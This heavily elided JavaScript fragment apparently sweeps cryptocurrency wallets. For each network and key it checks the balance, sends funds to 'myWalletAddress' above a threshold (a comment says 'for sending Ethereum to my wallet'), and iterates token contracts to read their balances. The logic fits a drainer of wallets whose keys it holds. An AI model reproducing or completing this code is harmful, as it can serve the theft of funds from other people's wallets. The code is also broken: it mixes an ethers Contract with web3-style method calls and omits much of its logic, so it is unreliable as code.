...
const sendTransaction = async (provider, wallet) => {
  ...
  try {
    const destination = myWalletAddress
...
const runForNetwork = async (network, key) => {
  ...
  let w3
        ...
        try {
          //also thr signer
          //Necessary for removing the 0X prefix
          //console.log(w3)
          ...
          if (balance >= 5000000000000000) { 
            ...
            sendTransaction(w3, wallet)
            //console.log("connect")
            // console.log(wallet.connect())
            //console.log("chainid")
            let chainid = await wallet.getChainId()
            console.log(chainid)
            //Necessary for sending Ethereum to my wallet
          ...
          contracts.forEach(async contract => {
            try {
              ...
              let web3ContractInstance = new ethers2.Contract(contract, abis[contract], w3)
              console.log(web3ContractInstance.methods)
              let tokenBalance = await web3ContractInstance.methods.balanceOf(wallet.address).call()
